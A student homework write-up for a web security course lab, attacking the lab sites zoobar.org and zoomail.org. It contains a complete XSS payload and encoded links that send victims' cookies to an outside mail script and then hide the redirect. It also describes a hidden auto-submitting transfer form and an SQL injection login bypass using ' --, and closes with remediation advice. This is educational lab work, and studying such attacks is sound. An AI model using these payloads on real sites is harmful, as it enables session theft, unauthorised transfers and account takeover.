@@ -1,0 +1,127 @@
+﻿CS642: Homework 3:
+Jesus & Nic
+
+
+Part A: Cookie Theft
+
+
+Attack implementation:
+
+
+Using a double quote and a greater than character, we can terminate the tag that the user var started at. From there we can begin writing script tags to do the email sending, cookie retrieval, and redirect back to the site.
+
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+A brief break down of this string:
+
+
+Escape chars:  “> 
+This string allowed us to get html injection and Client side XSS..
+
+
+Mail Script:
+javascript:void((new Image()).src='http://zoomail.org/sendmail.php?' + '&netid= jwvazquez _ndraves' + '&payload=' +document.cookie + '&random=' + Math.random());
+
+
+^ Modified version of the javascript script from sendmail.php.
+Added net id’s and cookies from users.php.
+
+
+Hiding Errors:
+window.location.assign("http://zoobar.org/users.php");
+
+
+^ Used to return the user back to the search page and clean up the broken looking HTML and get rid of the large URL String
+
+
+Attack Explanation:
+
+
+After logging into zoobar.org and heading over to the users page, we saw that there was a user text box which could search for users. This text box also modified a url parameter called user, and changing one of them, would change the other. Seeing the user entry page, we tried names, special characters, numbers, and different lengths of inputs and found that the input did not appear to be sanitized. Looking at how the quote character allowed for the user to modify the html page, it also meant the characters were not encoded for html safety. This meant we could craft an input to do html injection and client side Cross site scripting. The goal was to find if we could steal cookies, and with client side cross site scripting, we now have a way to read the user’s cookies. Now we needed to figure out a way to export them back to us. One of the other provided services was zoomail.org, which included a client side javascript email library. Using the send email function from the service, we could now send data over email. With all of this discovered, there was a clear way that we could send out a zoobar.org session cookie. As mentioned earlier, the url parameter also could be used to change the input on the user search page, so adjusting the existing javascript for the user search box, making it URL safe, the new payload was a link and could be sent to a user of zoobar.org so that the attacker could log in as that user from the stolen cookie. When adjusting the input for the URL, additional javascript was added to refresh the page and remove the extra parameters. This makes it so it is more stealthy and the user won’t be confused by broken html, or very long URLS.
+
+
+
+
+(Other version of the encoded URL String)
+
+
+http://zoobar.org/users.php?user=%5C%22%5C%3E%5C%3Cscript%5C%3Ejavascript%3Avoid%28%28new+Image%28%29%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3F%27+%2B+%27%26netid%3D+jwvazquez+_ndraves%27+%2B+%27%26payload%3D%27+%2Bdocument.cookie+%2B+%27%26random%3D%27+%2B+Math.random%28%29%29%3B+window.location.assign%28%22http%3A%2F%2Fzoobar.org%2Fusers.php%3F%22%29%3B+%5C%3C%2Fscript%5C%3E
+
+
+
+
+http://zoobar.org/users.php?user=%22\%20\size\%3D10\%3E\%3Cscript\%3Ejavascript\%3Avoid\%28\%28new\%20Image\%28\%29\%29.src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3F\%26netid\%3Djwvazquez_ndraves\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random\%28\%29\%29\%3Bwindow.location.assign\%28\%22http\%3A\%2F\%2Fzoobar.org\%2Fusers.php\%22\%29\%3B\%3C/script\%3E
+
+
+
+
+
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+
+
+
+Part B: Cross Site Scripting (XSS)
+(1) Given cookies are not obfuscated, a Cross-Site Scripting Vulnerability is present which allows a malicious link to cause a transaction to take place without the users knowledge.
+
+
+Attack implementation:
+
+
+This HTML is broken into 3 areas, the form block, the iframe, and the script block. The script block first figures out if the user is on the site. When everything is loaded enough, it then submits the form. The post request is then rendered in the iframe so that the malicious transaction takes place on the site, but hidden in the iframe. Finally once the iframe has returned a response, the post request is complete and then the user can be redirected to Bing so that the whole process doesn't make the user question too much.  
+
+
+
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+Attack Explanation:
+
+
+The next vulnerability we were assigned to look at was cross site scripting. The one we are looking at today allows us to send an api call to zoobar.org as the client, and then maliciously transfers their 10 zoobars into our account. This works because the older web browser has less strict permissions on what data the website can and cannot access, as well as how we set up our site to make stealing stealthy. For this we saw we could send a post request as the user by auto submitting a form when they connected to our site. If they were a member of the service zoobar.org, the post request would be coming from the client web browser, and since their browser connected to the site, we could forward the cookies and authenticate as them to get the 10 zoobar. The way we set this up was with a form post with 2 inputs and a submit button. This is similar to the one on the client side of the official site because we needed to send a post request to their API api. From here, we added a hidden  i-frame that would keep the submission of the cross site scripting hidden from the user if it wasn’t blocked. We then had a script block at the bottom of the html page that auto submitted the first form that did the API translation, and another that redirected to http://www.bing.com so it didn’t look suspicious that a link just jumped to your foobar account. This process then goes as follows. The user was already logged into the site before going to our website, the user connected and the form submits the transaction to zoobar.org, and then immediately moves to bing. The two script blocks and the iframe make everything work smoothly and can keep things hidden by toggling the visibility of the form submission, and then moves you off the site completely. If the attack worked correctly, attacker’s account should have 10 more zoobar.  
+
+
+
+
+
+
+ 
+
+
+
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+Part C: SQL Injection
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+(1) An SQL injection vulnerability exists in auth.php where a malicious actor can input a malicious string into the username field which bypasses user authentication, provides the ability to retrieve list of all users in database and more. 
+
+
+(2) The part of the zoobar.org PHP code that handles the user login and registration is ‘auth.php’. On line 19, we see a function named ‘_checkLogin’ which contains a vulnerable SQL query (line 26) which can be exploited using a maliciously crafted username or password(i.e SQL Injection).
+"SELECT * FROM Person WHERE " .
+"Username = '$username' AND " .
+"Password = '$hashedpassword'";
+
+
+This SQL query asks the database to return:
+- all details(*)
+- from the Person table
+- where Username is {any user name} AND Password is {password for said user}
+
+
+Given we’d like to access any user account, we began by looking at how we can exploit the login_username text field. Ultimately, the SQL query needs to terminate at ‘Username = ‘$username’ such that the query becomes: 
+"SELECT * FROM Person WHERE " .
+"Username = '$username'”
+This SQL query asks the database to return:
+- all details(*)
+- from the Person table
+- where Username is {any username}
+
+
+Thus, to accomplish this, we can use the following string to do just that: “ ‘ -- “
+
+
+This is because the double-dash sequence is a comment-indicator in SQL and everything after it is viewed as a comment in SQL query land. Thus, the exploit successfully retrieves all details for a specified user.
+
+
+(3) Using parameterized queries ( i.e prepared statements ) instead of string concatenation within the query (Suggested: https://portswigger.net/web-security/sql-injection). 
+In addition, sanitizing any input such that it cannot include malicious characters as used above.
